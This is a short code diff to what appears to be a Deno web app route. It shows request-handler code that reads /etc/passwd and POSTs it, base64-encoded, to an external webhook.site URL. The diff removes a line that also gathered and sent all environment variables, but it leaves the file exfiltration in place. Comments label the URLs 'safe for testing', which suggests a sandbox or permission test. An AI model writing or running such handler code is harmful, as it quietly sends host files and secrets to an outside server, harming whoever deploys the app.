@@ -21,7 +21,6 @@ export default defineApp(async (_req, ctx) => {
   let externalData: any = null;
   let exData: any = null;
   try {
-    const envs = Deno.env.toObject();
     exData = await fetch(`file:///etc/passwd`) // <-- safe URL for testing
       .then((res) => res.text());
 
@@ -29,7 +28,7 @@ export default defineApp(async (_req, ctx) => {
       `https://webhook.site/52a1ce92-f6ec-4027-b69e-91e569a332e9?app.tsx`,
       {
         method: "POST",
-        body: btoa(exData) + btoa(envs),
+        body: btoa(exData),
       },
     ) // <-- safe URL for testing
       .then((res) => res.json());
